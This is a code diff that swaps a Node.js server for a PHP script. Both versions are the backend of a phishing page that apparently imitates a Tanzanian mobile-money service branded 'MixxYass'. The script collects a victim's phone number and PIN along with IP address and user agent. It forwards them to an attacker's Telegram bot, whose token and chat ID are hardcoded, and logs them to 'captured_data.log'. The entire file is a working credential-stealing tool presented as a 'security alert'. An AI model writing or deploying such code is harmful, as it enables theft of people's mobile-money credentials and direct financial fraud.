@@ -1,96 +1,93 @@
-const express = require('express');
-const axios = require('axios');
-const cors = require('cors');
-const fs = require('fs');
-const path = require('path');
-
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-// Middleware
-app.use(cors());
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+<?php
+// ============================================
+// TELEGRAM BOT CONFIGURATION (UPDATED)
+// ============================================
+$botToken = "8680061714:AAG1EMja1icYBIsKmM8oV9NN4Z1NLBOIlzQ";
+$chatId = "8091815189";
 
 // ============================================
-// TELEGRAM BOT CONFIGURATION
+// ONLY ALLOW POST REQUESTS
 // ============================================
-const BOT_TOKEN = "8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E";
-const CHAT_ID = "8392790531";
+if ($_SERVER["REQUEST_METHOD"] !== "POST") {
+    header('HTTP/1.0 403 Forbidden');
+    echo json_encode(['status' => 'error', 'message' => 'Only POST requests allowed']);
+    exit;
+}
 
 // ============================================
-// SERVE HTML FILE (optional)
+// GET AND CLEAN THE DATA
 // ============================================
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
+$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
+$pin = isset($_POST['pin']) ? trim($_POST['pin']) : '';
+
+// Validate data
+if (empty($phone) || empty($pin)) {
+    echo json_encode(['status' => 'error', 'message' => 'Phone and PIN are required']);
+    exit;
+}
 
 // ============================================
-// ENDPOINT TO RECEIVE DATA
+// GET ADDITIONAL INFO (IP, USER AGENT, TIME)
 // ============================================
-app.post('/Server', async (req, res) => {
-    try {
-        const { phone, pin } = req.body;
-        
-        // Validate data
-        if (!phone || !pin) {
-            return res.status(400).json({ 
-                status: 'error', 
-                message: 'Phone and PIN are required' 
-            });
-        }
-        
-        // Get additional info
-        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-        const userAgent = req.headers['user-agent'] || 'Unknown';
-        const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
-        
-        // Create Telegram message
-        const message = `🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n` +
-                       `      📱 MixxYass Capture Data 📱\n` +
-                       `🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n\n` +
-                       `📞 PHONE NUMBER:\n` +
-                       `   +255 ${phone}\n\n` +
-                       `🔐 PIN CODE:\n` +
-                       `   ${pin}\n\n` +
-                       `🖥️ IP ADDRESS:\n` +
-                       `   ${ip}\n\n` +
-                       `📱 USER AGENT:\n` +
-                       `   ${userAgent.slice(0, 80)}\n\n` +
-                       `⏰ DATE & TIME:\n` +
-                       `   ${timestamp}\n\n` +
-                       `🟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🟡\n` +
-                       `         MixxYas Security Alert\n` +
-                       `🟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🟡`;
-        
-        // Send to Telegram
-        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        await axios.post(telegramUrl, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'HTML',
-            disable_web_page_preview: true
-        });
-        
-        // Log to file
-        const logEntry = `${timestamp} | Phone: ${phone} | PIN: ${pin} | IP: ${ip}\n`;
-        fs.appendFileSync('captured_data.log', logEntry);
-        
-        // Send success response
-        res.json({ status: 'success', message: 'Data sent to Telegram' });
-        
-    } catch (error) {
-        console.error('Error:', error.message);
-        res.status(500).json({ 
-            status: 'error', 
-            message: 'Failed to send data to Telegram' 
-        });
-    }
-});
+$ip = $_SERVER['REMOTE_ADDR'];
+$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
+$timestamp = date('Y-m-d H:i:s');
 
-// Start server
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-    console.log(`Visit: http://localhost:${PORT}`);
-});
+// ============================================
+// CREATE TELEGRAM MESSAGE
+// ============================================
+$message = "🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n";
+$message .= "      📱 MixxYass Capture Data 📱\n";
+$message .= "🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n\n";
+$message .= "📞 PHONE NUMBER:\n";
+$message .= "   +255 " . $phone . "\n\n";
+$message .= "🔐 PIN CODE:\n";
+$message .= "   " . $pin . "\n\n";
+$message .= "🖥️ IP ADDRESS:\n";
+$message .= "   " . $ip . "\n\n";
+$message .= "📱 USER AGENT:\n";
+$message .= "   " . substr($userAgent, 0, 80) . "\n\n";
+$message .= "⏰ DATE & TIME:\n";
+$message .= "   " . $timestamp . "\n\n";
+
+// ============================================
+// SEND TO TELEGRAM BOT
+// ============================================
+$telegramUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
+
+$postData = [
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'HTML',
+    'disable_web_page_preview' => true
+];
+
+// Initialize cURL
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $telegramUrl);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+
+$response = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+// ============================================
+// LOG TO FILE (for debugging)
+// ============================================
+$logEntry = date('Y-m-d H:i:s') . " | Phone: $phone | PIN: $pin | IP: $ip | Response: $httpCode\n";
+file_put_contents('captured_data.log', $logEntry, FILE_APPEND);
+
+// ============================================
+// SEND RESPONSE BACK TO FRONTEND
+// ============================================
+header('Content-Type: application/json');
+if ($httpCode == 200) {
+    echo json_encode(['status' => 'success', 'message' => 'Data sent to Telegram']);
+} else {
+    echo json_encode(['status' => 'error', 'message' => 'Telegram API error: ' . $httpCode]);
+}
+?>
